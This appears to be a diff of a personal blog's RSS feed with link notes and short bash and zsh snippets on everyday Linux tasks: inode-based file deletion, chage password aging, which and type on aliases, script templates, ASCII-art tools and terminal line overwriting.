-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">6517085&lt;/span> -rw-r--r-- &lt;span style="color:#ae81ff">1&lt;/span> ZZ &lt;span style="color:#ae81ff">197121&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> Nov &lt;span style="color:#ae81ff">6&lt;/span> 06:18 &lt;span style="color:#e6db74">&amp;#39;␴ω␴␴␣␦&amp;#39;$&amp;#39;\342\220\264&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">7826050&lt;/span> -rw-r--r-- &lt;span style="color:#ae81ff">1&lt;/span> ZZ &lt;span style="color:#ae81ff">197121&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> Nov &lt;span style="color:#ae81ff">9&lt;/span> 04:23 &lt;span style="color:#e6db74">&amp;#39;&amp;#39;$&amp;#39;\356\200\215\356\200\215\356\200\215&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">4685554&lt;/span> -rw-r--r-- &lt;span style="color:#ae81ff">1&lt;/span> ZZ &lt;span style="color:#ae81ff">197121&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> Nov &lt;span style="color:#ae81ff">6&lt;/span> 06:27
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>we can delete the desired file by passing its inode number to the -inum switch of the find command&lt;/p></description></item><item><title>/etc/shadow and Creating yescrypt, MD5, SHA-256, and SHA-512 Password Hashes</title><link>https://linzeyan.github.io/posts/2022/20221114-shadow-passwords/</link><pubDate>Mon, 14 Nov 2022 12:55:39 +0800</pubDate><guid>https://linzeyan.github.io/posts/2022/20221114-shadow-passwords/</guid><description>&lt;ul>
-&lt;li>&lt;a href="https://www.baeldung.com/linux/shadow-passwords" target="_blank" rel="noopener">/etc/shadow and Creating yescrypt, MD5, SHA-256, and SHA-512 Password Hashes&lt;/a>&lt;/li>
-&lt;/ul>
-&lt;h5 id="chage-and-password-aging">chage and Password Aging&lt;/h5>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>chage --list root
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Last password change : Oct 01, &lt;span style="color:#ae81ff">2022&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Password expires : never
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Password inactive : never
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Account expires : never
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Minimum number of days between password change : &lt;span style="color:#ae81ff">0&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Maximum number of days between password change : &lt;span style="color:#ae81ff">99999&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Number of days of warning before password expires : &lt;span style="color:#ae81ff">7&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Consequently, we can change any field via its associated flag:&lt;/p></description></item><item><title>How to Use which on an Aliased Command</title><link>https://linzeyan.github.io/posts/2022/20221110-which-on-an-aliased-command/</link><pubDate>Thu, 10 Nov 2022 16:24:30 +0800</pubDate><guid>https://linzeyan.github.io/posts/2022/20221110-which-on-an-aliased-command/</guid><description>&lt;ul>
-&lt;li>&lt;a href="https://www.baeldung.com/linux/which-on-an-aliased-command" target="_blank" rel="noopener">How to Use which on an Aliased Command&lt;/a>&lt;/li>
-&lt;/ul>
-&lt;h5 id="type">type&lt;/h5>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>type grep
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>grep is an alias &lt;span style="color:#66d9ef">for&lt;/span> grep --color&lt;span style="color:#f92672">=&lt;/span>auto
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Bash&amp;#39;s type&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>type -P grep
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/usr/bin/grep
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Zsh&amp;#39;s type&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>type -p grep
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>grep is /usr/bin/grep
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h5 id="gnu-which">GNU which&lt;/h5>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>which -a which
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>which: shell built-in command
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/usr/bin/which
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>alias top10
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>top10&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;print -l ${(o)history%% *} | uniq -c | sort -nr | head -n 10&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>alias | /usr/bin/which -i top10
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>top10&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;print -l ${(o)history%% *} | uniq -c | sort -nr | head -n 10&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> /usr/bin/uniq
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> /usr/bin/sort
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> /usr/bin/head
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Shell Script Best Practices</title><link>https://linzeyan.github.io/posts/2022/20221103-shell-script-best-practices/</link><pubDate>Thu, 03 Nov 2022 16:51:11 +0800</pubDate><guid>https://linzeyan.github.io/posts/2022/20221103-shell-script-best-practices/</guid><description>&lt;ul>
-&lt;li>&lt;a href="https://sharats.me/posts/shell-script-best-practices/" target="_blank" rel="noopener">Shell Script Best Practices&lt;/a>&lt;/li>
-&lt;/ul>
-&lt;h4 id="things">Things&lt;/h4>
-&lt;ol>
-&lt;li>Just make the first line be &lt;code>#!/usr/bin/env bash&lt;/code>.&lt;/li>
-&lt;li>Use the &lt;code>.sh&lt;/code> (or &lt;code>.bash&lt;/code>) extension for your file.&lt;/li>
-&lt;li>Use &lt;code>set -o errexit&lt;/code> at the start of your script.&lt;/li>
-&lt;li>Prefer to use &lt;code>set -o nounset&lt;/code>.
-&lt;ol>
-&lt;li>use &lt;code>&amp;quot;${VARNAME-}&amp;quot;&lt;/code> instead of &lt;code>&amp;quot;$VARNAME&amp;quot;&lt;/code>&lt;/li>
-&lt;/ol>
-&lt;/li>
-&lt;li>Use &lt;code>set -o pipefail&lt;/code>.&lt;/li>
-&lt;li>Use &lt;code>set -o xtrace&lt;/code>, with a check on &lt;code>$TRACE&lt;/code> env variable.
-&lt;ol>
-&lt;li>&lt;code>if [[ &amp;quot;${TRACE-0}&amp;quot; == &amp;quot;1&amp;quot; ]]; then set -o xtrace; fi&lt;/code>&lt;/li>
-&lt;li>People can now enable debug mode, by running your script as &lt;code>TRACE=1 ./script.sh&lt;/code> instead of &lt;code>./script.sh&lt;/code>.&lt;/li>
-&lt;/ol>
-&lt;/li>
-&lt;li>Use &lt;code>[[ ]]&lt;/code> for conditions in &lt;code>if&lt;/code> / &lt;code>while&lt;/code> statements, instead of &lt;code>[ ]&lt;/code> or &lt;code>test&lt;/code>.&lt;/li>
-&lt;li>Always quote variable accesses with double-quotes.&lt;/li>
-&lt;li>Use &lt;code>local&lt;/code> variables in functions.&lt;/li>
-&lt;li>When printing error messages, please redirect to stderr.
-&lt;ol>
-&lt;li>Use &lt;code>echo 'Something unexpected happened' &amp;gt;&amp;amp;2&lt;/code> for this.&lt;/li>
-&lt;/ol>
-&lt;/li>
-&lt;li>Use long options, where possible (like &lt;code>--silent&lt;/code> instead of &lt;code>-s&lt;/code>).&lt;/li>
-&lt;li>If appropriate, change to the script&amp;rsquo;s directory close to the start of the script.
-&lt;ol>
-&lt;li>Use cd &amp;ldquo;$(dirname &amp;ldquo;$0&amp;rdquo;)&amp;rdquo;, which works in most cases.&lt;/li>
-&lt;/ol>
-&lt;/li>
-&lt;li>Use &lt;code>shellcheck&lt;/code>. Heed its warnings.&lt;/li>
-&lt;/ol>
-&lt;h4 id="template">Template&lt;/h4>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env bash
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set -o errexit
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set -o nounset
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set -o pipefail
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">[[&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>TRACE-0&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span> &lt;span style="color:#f92672">]]&lt;/span>; &lt;span style="color:#66d9ef">then&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> set -o xtrace
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">fi&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">[[&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>1-&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&lt;/span>~ ^-*h&lt;span style="color:#f92672">(&lt;/span>elp&lt;span style="color:#f92672">)&lt;/span>?$ &lt;span style="color:#f92672">]]&lt;/span>; &lt;span style="color:#66d9ef">then&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> echo &lt;span style="color:#e6db74">&amp;#39;Usage: ./script.sh arg-one arg-two
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">This is an awesome bash script to make your life better.
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">fi&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cd &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#66d9ef">$(&lt;/span>dirname &lt;span style="color:#e6db74">&amp;#34;&lt;/span>$0&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#66d9ef">)&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>main&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> echo &lt;span style="color:#66d9ef">do&lt;/span> awesome stuff
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>main &lt;span style="color:#e6db74">&amp;#34;&lt;/span>$@&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>The Art of Command Line</title><link>https://linzeyan.github.io/posts/2022/20221102-the-art-of-command-line/</link><pubDate>Wed, 02 Nov 2022 15:04:37 +0800</pubDate><guid>https://linzeyan.github.io/posts/2022/20221102-the-art-of-command-line/</guid><description>&lt;ul>
-&lt;li>&lt;a href="https://github.com/jlevy/the-art-of-command-line" target="_blank" rel="noopener">The Art of Command Line&lt;/a>&lt;/li>
-&lt;/ul></description></item><item><title>Printing ASCII Art in the Shell</title><link>https://linzeyan.github.io/posts/2022/20221021-shell-printing-ascii-art/</link><pubDate>Fri, 21 Oct 2022 17:30:41 +0800</pubDate><guid>https://linzeyan.github.io/posts/2022/20221021-shell-printing-ascii-art/</guid><description>&lt;ul>
-&lt;li>&lt;a href="https://www.baeldung.com/linux/shell-printing-ascii-art" target="_blank" rel="noopener">Printing ASCII Art in the Shell&lt;/a>&lt;/li>
-&lt;/ul>
-&lt;h5 id="banner">banner&lt;/h5>
-&lt;blockquote>
-&lt;p>&lt;code>sudo apt install sysvbanner&lt;/code>&lt;/p>&lt;/blockquote>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ banner hello
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># # ###### # # ####&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># # # # # # #&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">###### ##### # # # #&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># # # # # # #&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># # # # # # #&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># # ###### ###### ###### ####&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h5 id="figlet-frank-ian-and-glenns-letters">FIGlet: Frank, Ian, and Glenn&amp;rsquo;s Letters&lt;/h5>
-&lt;blockquote>
-&lt;p>&lt;code>sudo apt install figlet&lt;/code>&lt;/p>&lt;/blockquote>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ figlet hello
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _ _ _
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| |__ ___| | | ___
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>_ &lt;span style="color:#ae81ff">\ &lt;/span>/ _ &lt;span style="color:#ae81ff">\ &lt;/span>| |/ _ &lt;span style="color:#ae81ff">\
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span>| | | | __/ | | &lt;span style="color:#f92672">(&lt;/span>_&lt;span style="color:#f92672">)&lt;/span> |
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_| |_|&lt;span style="color:#ae81ff">\_&lt;/span>__|_|_|&lt;span style="color:#ae81ff">\_&lt;/span>__/
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
-&lt;li>&lt;code>-f&lt;/code> option and specify a font name for the output&lt;/li>
-&lt;li>&lt;code>-l&lt;/code>, &lt;code>-c&lt;/code>, and &lt;code>-r&lt;/code> options to align the text to the left, center, or right,&lt;/li>
-&lt;/ul>
-&lt;h5 id="toilet-figlet-with-more-options">TOIlet: FIGlet With More Options&lt;/h5>
-&lt;blockquote>
-&lt;p>&lt;code>sudo apt install toilet&lt;/code>&lt;/p></description></item><item><title>How to Make Output Overwrite the Same Line in a Terminal</title><link>https://linzeyan.github.io/posts/2022/20221021-echo-printf-overwrite-terminal-line/</link><pubDate>Fri, 21 Oct 2022 17:29:10 +0800</pubDate><guid>https://linzeyan.github.io/posts/2022/20221021-echo-printf-overwrite-terminal-line/</guid><description>&lt;ul>
-&lt;li>&lt;a href="https://www.baeldung.com/linux/echo-printf-overwrite-terminal-line" target="_blank" rel="noopener">How to Make Output Overwrite the Same Line in a Terminal&lt;/a>&lt;/li>
-&lt;/ul>
-&lt;h5 id="introduction-to-the-problem">Introduction to the Problem&lt;/h5>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ cat print_status.sh
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>!/bin/bash
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#e6db74">&amp;#34;[INFO] Processing file: readme.txt&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sleep &lt;span style="color:#ae81ff">2&lt;/span> To simulate the file processing
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#e6db74">&amp;#34;[INFO] Processing file: veryPowerfulService.service&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sleep &lt;span style="color:#ae81ff">2&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#e6db74">&amp;#34;[INFO] Processing file: log.txt&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#e6db74">&amp;#34;DONE&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ./print_status.sh
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>INFO&lt;span style="color:#f92672">]&lt;/span> Processing file: readme.txt
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>INFO&lt;span style="color:#f92672">]&lt;/span> Processing file: veryPowerfulService.service
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>INFO&lt;span style="color:#f92672">]&lt;/span> Processing file: log.txt
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DONE
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h5 id="the-magic-code-0330kr">The &amp;ldquo;Magic Code&amp;rdquo;: &lt;code>\033[0K\r&lt;/code>&lt;/h5>
-&lt;ul>
-&lt;li>&lt;code>-n&lt;/code> option asks the echo command to stop outputting the trailing newline character&lt;/li>
-&lt;li>&lt;code>-e&lt;/code> option allows the echo command to interpret backslash escapes such as &lt;code>\n&lt;/code> (newline) and &lt;code>\r&lt;/code> (carriage return)&lt;/li>
-&lt;li>&lt;code>\033&lt;/code> - It&amp;rsquo;s the escape sequence. In other words, it&amp;rsquo;s ESC.&lt;/li>
-&lt;li>&lt;code>\033[&lt;/code> - Then this becomes &amp;ldquo;ESC [&amp;rdquo;, which is the control sequence introducer (CSI).&lt;/li>
-&lt;li>&lt;code>\033[0k&lt;/code> - So it&amp;rsquo;s &amp;ldquo;CSI 0 K&amp;rdquo;. Further, &amp;ldquo;CSI 0 K&amp;rdquo; erases the text from the cursor to the end of the line.&lt;/li>
-&lt;li>&lt;code>\r&lt;/code> - This is the carriage return. It brings the cursor to the beginning of the line.&lt;/li>
-&lt;/ul>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ cat print_status.sh
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/bin/bash&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo -ne &lt;span style="color:#e6db74">&amp;#34;[INFO] Processing file: readme.txt\033[0K\r&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sleep &lt;span style="color:#ae81ff">2&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo -ne &lt;span style="color:#e6db74">&amp;#34;[INFO] Processing file: veryPowerfulService.service\033[0K\r&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sleep &lt;span style="color:#ae81ff">2&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo -e &lt;span style="color:#e6db74">&amp;#34;[INFO] Processing file: log.txt\033[0K\r&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#e6db74">&amp;#34;DONE&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>!/bin/bash
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>printf &lt;span style="color:#e6db74">&amp;#34;[INFO] Processing file: readme.txt\033[0K\r&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sleep &lt;span style="color:#ae81ff">2&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>printf &lt;span style="color:#e6db74">&amp;#34;[INFO] Processing file: veryPowerfulService.service\033[0K\r&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sleep &lt;span style="color:#ae81ff">2&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>printf &lt;span style="color:#e6db74">&amp;#34;[INFO] Processing file: log.txt\033[0K\r\n&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#e6db74">&amp;#34;DONE&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Zsh tab-completion not working</title><link>https://linzeyan.github.io/posts/2021/20211210-zsh-tab-completion-not-working/</link><pubDate>Fri, 10 Dec 2021 17:44:49 +0800</pubDate><guid>https://linzeyan.github.io/posts/2021/20211210-zsh-tab-completion-not-working/</guid><description>&lt;ul>
-&lt;li>&lt;a href="https://stackoverflow.com/questions/46939906/zsh-tab-completion-not-working" target="_blank" rel="noopener">Zsh tab-completion not working&lt;/a>&lt;/li>
-&lt;/ul>
-&lt;h4 id="question">Question&lt;/h4>
-&lt;p>Although I&amp;rsquo;ve used Oh-My-Zsh in the past, I decided this time around (i.e. setting up a new computer) I&amp;rsquo;d try to avoid installing it to keep things a bit leaner. Right now I&amp;rsquo;m trying to cherry-pick Oh-My-Zsh&amp;rsquo;s insensitive tab-completion feature. Digging around its source repo, I found the following line:
-&lt;code>zstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}' 'r:|=*' 'l:|=* r:|=*'&lt;/code>&lt;/p>
-&lt;p>I&amp;rsquo;m fairly confident this is the line Oh-My-Zsh executes to do what I want, so I tried adding it to my &lt;code>.zshrc&lt;/code>. Restarted my terminal. Typed &lt;code>cd desk&lt;/code>, then hit [tab]. No dice &amp;ndash; I didn&amp;rsquo;t get &lt;code>cd Desktop/&lt;/code>.&lt;/p></description></item><item><title>Best Practices for Writing Bash Scripts</title><link>https://linzeyan.github.io/posts/2021/20211206-bash-best-practices/</link><pubDate>Mon, 06 Dec 2021 11:11:54 +0800</pubDate><guid>https://linzeyan.github.io/posts/2021/20211206-bash-best-practices/</guid><description>&lt;ul>
-&lt;li>&lt;a href="https://kvz.io/bash-best-practices.html" target="_blank" rel="noopener">Best Practices for Writing Bash Scripts&lt;/a>&lt;/li>
-&lt;li>&lt;a href="https://www.javacodegeeks.com/2013/10/shell-scripting-best-practices.html" target="_blank" rel="noopener">Shell Scripting - Best Practices&lt;/a>&lt;/li>
-&lt;/ul>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env bash
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75715e"># Bash3 Boilerplate. Copyright (c) 2014, kvz.io&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set -o errexit
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set -o pipefail
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set -o nounset
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># set -o xtrace&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Set magic variables for current file &amp;amp; dir&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>__dir&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#66d9ef">$(&lt;/span>cd &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#66d9ef">$(&lt;/span>dirname &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>BASH_SOURCE[0]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#66d9ef">)&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> pwd&lt;span style="color:#66d9ef">)&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>__file&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>__dir&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">/&lt;/span>&lt;span style="color:#66d9ef">$(&lt;/span>basename &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>BASH_SOURCE[0]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#66d9ef">)&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
